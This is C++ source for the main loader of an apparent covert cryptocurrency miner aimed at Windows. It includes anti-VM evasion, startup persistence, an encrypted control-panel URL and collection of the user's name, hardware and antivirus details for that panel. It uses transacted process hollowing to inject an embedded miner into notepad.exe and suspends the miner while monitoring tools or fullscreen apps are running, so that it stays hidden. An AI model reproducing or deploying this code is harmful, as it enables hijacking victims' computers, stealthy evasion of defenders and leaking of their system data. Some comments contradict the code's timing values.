#include <windows.h>

#include <iostream>
#include <stdio.h>
#include <csignal>

#include "../include/ntddk.h"
#include "../include/kernel32_undoc.h"
#include "../include/util.h"

#include "../include/pe_hdrs_helper.h"
#include "../include/hollowing_parts.h"
#include "../include/delete_pending_file.h"
#include "../include/http_client.h"
#include "../include/json_printer.h"
#include "../include/config_manager.h"
#include "../include/encryption.h"
#include "../src/inject_core.cpp"
#include "../include/embedded_resource.h"

#ifdef ENABLE_ANTIVM
#include "../include/antivm.h"
#endif

#ifdef ENABLE_PERSISTENCE
#include "../include/persistence.h"
#endif

// Global variables for signal handling
static DWORD g_minerPid = 0;
static HANDLE g_minerProcess = NULL;

// Signal handler for graceful shutdown
BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (signal == CTRL_C_EVENT || signal == CTRL_BREAK_EVENT || 
        signal == CTRL_CLOSE_EVENT || signal == CTRL_SHUTDOWN_EVENT) {
#ifdef _DEBUG
        std::cout << "[!] Signal received, terminating miner process..." << std::endl;
#endif
        
        if (g_minerProcess != NULL) {
            TerminateProcess(g_minerProcess, 0);
            CloseHandle(g_minerProcess);
        }
        
        return TRUE;
    }
    return FALSE;
}

int main(int argc, char *argv[])
{
    // Check if another instance is already running
    if (IsAnotherInstanceRunning("Global\\CMM")) {
#ifdef _DEBUG
        std::cerr << "[!] Another instance is already running. Exiting." << std::endl;
#endif
        return 0;
    }

    // Register signal handler to cleanup miner process on termination
    if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {
#ifdef _DEBUG
        std::cerr << "[-] Failed to set console control handler" << std::endl;
#endif
    }

#ifdef ENABLE_ANTIVM
    // Run anti-VM detection
    auto vmResult = AntiVM::DetectVM();
    if (vmResult.first) {
#ifdef _DEBUG
        std::cerr << "[!] VM/Sandbox detected: " << vmResult.second << std::endl;
#endif
        // Exit silently in release mode to avoid detection
        return 0;
    }
#ifdef _DEBUG
    std::cout << "[+] Anti-VM check passed: " << vmResult.second << std::endl;
#endif
#endif

#ifdef ENABLE_PERSISTENCE
    // Add to startup for persistence
    if (Persistence::AddToStartup()) {
#ifdef _DEBUG
        std::cout << "[+] Successfully added to startup" << std::endl;
#endif
    } else {
#ifdef _DEBUG
        std::cerr << "[-] Failed to add to startup" << std::endl;
#endif
    }
#endif

    std::string panelUrlsStr = ENCRYPT_STR("http://127.0.0.1:8080/api/miners/submit");
    
#ifdef _DEBUG
    std::cout << "[DEBUG] Decrypted URL(s): " << panelUrlsStr << std::endl;
#endif
    
    // Get system information
    std::string pcUsername = GetWindowsUsername();
    std::string deviceHash = GetComputerHash();
    std::string cpuName = GetCPUName();
    std::string gpuName = GetGPUName();
    std::string antivirusName = GetAntivirusName();
    
#ifdef _DEBUG
    std::cout << "[*] System Information:" << std::endl;
    std::cout << "    Username: " << pcUsername << std::endl;
    std::cout << "    Device Hash: " << deviceHash << std::endl;
    std::cout << "    CPU: " << cpuName << std::endl;
    std::cout << "    GPU: " << gpuName << std::endl;
    std::cout << "    Antivirus: " << antivirusName << std::endl;
#endif
    
    // Initialize config manager
    ConfigManager configManager;
    
    // Fetch configuration from panel(s) with fallback support
#ifdef _DEBUG
    std::cout << "[*] Fetching configuration from panel..." << std::endl;
#endif
    if (!configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, 0.0, 0.0, GetSystemUptimeMinutes())) {
        std::cerr << "[-] Failed to fetch configuration from all panel URLs. Exiting." << std::endl;
        return 1;
    }
    
    const MinerConfig& cpuConfig = configManager.GetCPUConfig();
    const MinerConfig& gpuConfig = configManager.GetGPUConfig();
    
    // Verify we have valid configurations
    if (cpuConfig.mining_url.empty() && gpuConfig.mining_url.empty()) {
        std::cerr << "[-] No valid mining configuration received from panel. Exiting." << std::endl;
        return 1;
    }
    
    const bool is32bit = false;

    // Create mutable buffers
    wchar_t payloadPath[MAX_PATH] = {0};
    wchar_t targetPath[MAX_PATH] = L"C:\\Windows\\system32\\notepad.exe";

    size_t payloadSize = 0;
    BYTE *payladBuf = nullptr;
    
    try {
        LoadEmbeddedExe(payladBuf, payloadSize);
    } catch (const std::exception& e) {
        std::cerr << "[-] Failed to load embedded exe: " << e.what() << std::endl;
        return -1;
    }
    
    if (payladBuf == NULL)
    {
        std::cerr << "Cannot read payload!" << std::endl;
        return -1;
    }

    // Build command line arguments from config
    // Prefer CPU config if available, otherwise GPU config
    const MinerConfig& selectedConfig = !cpuConfig.mining_url.empty() ? cpuConfig : gpuConfig;
    bool isIdle = IsDeviceIdle(selectedConfig.wait_time_idle);
    std::string final_command = configManager.BuildCommandLineArgs(selectedConfig, isIdle);
    
    if (final_command.empty()) {
        std::cerr << "[-] Failed to build command line arguments" << std::endl;
        free_buffer(payladBuf);
        return 1;
    }
    
    // Store the initial config to detect changes
    MinerConfig lastCpuConfig = cpuConfig;
    MinerConfig lastGpuConfig = gpuConfig;
    bool usingCpuConfig = !cpuConfig.mining_url.empty();
    
#ifdef _DEBUG
    std::cout << "[+] Generated command: " << final_command << std::endl;
#endif

    DWORD pid = transacted_hollowing(targetPath, payladBuf, (DWORD)payloadSize, StringToLPWSTR(final_command));
    free_buffer(payladBuf);
    if (pid == 0)
    {
        std::cerr << "Injection failed!\n";
        return 1;
    }

    // Store global PID for signal handler
    g_minerPid = pid;

#ifdef _DEBUG
    std::cout << "Injected into PID: " << pid << "\n";
#endif

    // Later you can access the full process info:
    auto pi = ProcessStorage::GetProcess(pid);
    if (pi)
    {
        // Store global process handle for signal handler
        g_minerProcess = pi->hProcess;
#ifdef _DEBUG
        std::cout << "Process handle: " << pi->hProcess << "\n"
                  << "Thread handle: " << pi->hThread << "\n"
                  << "Main thread ID: " << pi->dwThreadId << "\n";
#endif
    }
    int checkInCounter = 0;
    const int CHECK_IN_INTERVAL = 1; // seconds

    while (true)
    {
        // Check in with panel every 5 seconds to update hashrate
        checkInCounter++;
        if (checkInCounter >= CHECK_IN_INTERVAL)
        {
            checkInCounter = 0;
            double currentHashrate = GetMinerHashrate();
            
            // Send hashrate to appropriate config (CPU or GPU)
            double cpuHashrate = usingCpuConfig ? currentHashrate : 0.0;
            double gpuHashrate = !usingCpuConfig ? currentHashrate : 0.0;
            
            if (currentHashrate >= 0) {
#ifdef _DEBUG
                std::cout << "[*] Sending hashrate update to panel: " << currentHashrate << " H/s";
                if (usingCpuConfig) {
                    std::cout << " (CPU)";
                } else {
                    std::cout << " (GPU)";
                }
                std::cout << std::endl;
#endif
                
                // Fetch config and check for changes
                if (configManager.FetchConfigFromPanelWithFallback(panelUrlsStr, pcUsername, deviceHash, cpuName, gpuName, antivirusName, cpuHashrate, gpuHashrate, GetSystemUptimeMinutes())) {
                    const MinerConfig& newCpuConfig = configManager.GetCPUConfig();
                    const MinerConfig& newGpuConfig = configManager.GetGPUConfig();
                    
                    // Check if config has changed
                    bool cpuConfigChanged = (newCpuConfig.mining_url != lastCpuConfig.mining_url ||
                                            newCpuConfig.wallet != lastCpuConfig.wallet ||
                                            newCpuConfig.password != lastCpuConfig.password ||
                                            newCpuConfig.non_idle_usage != lastCpuConfig.non_idle_usage ||
                                            newCpuConfig.idle_usage != lastCpuConfig.idle_usage);
                    
                    bool gpuConfigChanged = (newGpuConfig.mining_url != lastGpuConfig.mining_url ||
                                            newGpuConfig.wallet != lastGpuConfig.wallet ||
                                            newGpuConfig.password != lastGpuConfig.password ||
                                            newGpuConfig.non_idle_usage != lastGpuConfig.non_idle_usage ||
                                            newGpuConfig.idle_usage != lastGpuConfig.idle_usage);
                    
                    if (cpuConfigChanged || gpuConfigChanged) {
#ifdef _DEBUG
                        std::cout << "[!] Config changed on server, restarting miner..." << std::endl;
#endif
                        
                        // Kill current miner process
                        if (pi) {
                            TerminateProcess(pi->hProcess, 0);
                            WaitForSingleObject(pi->hProcess, INFINITE);
                        }
                        
                        // Update stored config
                        lastCpuConfig = newCpuConfig;
                        lastGpuConfig = newGpuConfig;
                        
                        // Build new command with updated config
                        usingCpuConfig = !newCpuConfig.mining_url.empty();
                        const MinerConfig& newSelectedConfig = usingCpuConfig ? newCpuConfig : newGpuConfig;
                        bool newIsIdle = IsDeviceIdle(newSelectedConfig.wait_time_idle);
                        std::string newCommand = configManager.BuildCommandLineArgs(newSelectedConfig, newIsIdle);
                        
                        // Restart miner with new config
                        pid = transacted_hollowing(targetPath, payladBuf, (DWORD)payloadSize, StringToLPWSTR(newCommand));
                        pi = ProcessStorage::GetProcess(pid);
#ifdef _DEBUG
                        std::cout << "[+] Miner restarted with new config. New PID: " << pid << std::endl;
#endif
                    }
                }
            }
        }

        if (!IsPidRunning(pid))
        {
#ifdef _DEBUG
            std::cout << "[!] Process with PID " << pid << " is NOT running." << std::endl;
#endif
            pid = transacted_hollowing(targetPath, payladBuf, (DWORD)payloadSize, StringToLPWSTR(final_command));
            pi = ProcessStorage::GetProcess(pid);
            if (AreProcessesRunning(processNames))
            {
                std::cout << "Monitoring detected running processes! not run func\n";
                NtSuspendProcess(pi->hProcess);
            }
            else if (IsForegroundWindowFullscreen())
            {
                std::cout << "Monitoring detected fullscreen processes!\n";
                NtSuspendProcess(pi->hProcess);
            }
            else
            {
                std::cout << "No monitored processes. not run func\n";
                NtResumeProcess(pi->hProcess);
            }
        }
        else
        {
#ifdef _DEBUG
            std::cout << "[!] Process with PID " << pid << " is running :)" << std::endl;
#endif
            if (AreProcessesRunning(processNames))
            {
                std::cout << "Monitoring detected running processes! run func\n";
                NtSuspendProcess(pi->hProcess);
            }
            else if (IsForegroundWindowFullscreen())
            {
                std::cout << "Monitoring detected fullscreen processes!\n";
                NtSuspendProcess(pi->hProcess);
            }
            else
            {
                std::cout << "No monitored processes. run func\n";
                NtResumeProcess(pi->hProcess);
            }
        }
        Sleep(10000);  // Check every 1 second (counter increments for 5s check-in)
    }

    return 0;
}

// WinMain entry point for GUI subsystem (WIN32 flag)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Convert Windows command line to argc/argv format and call main()
    int argc = 0;
    LPWSTR* argv_w = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    char** argv = new char*[argc];
    for (int i = 0; i < argc; i++) {
        int size = WideCharToMultiByte(CP_UTF8, 0, argv_w[i], -1, NULL, 0, NULL, NULL);
        argv[i] = new char[size];
        WideCharToMultiByte(CP_UTF8, 0, argv_w[i], -1, argv[i], size, NULL, NULL);
    }
    
    int result = main(argc, argv);
    
    // Cleanup
    for (int i = 0; i < argc; i++) {
        delete[] argv[i];
    }
    delete[] argv;
    LocalFree(argv_w);
    
    return result;
}

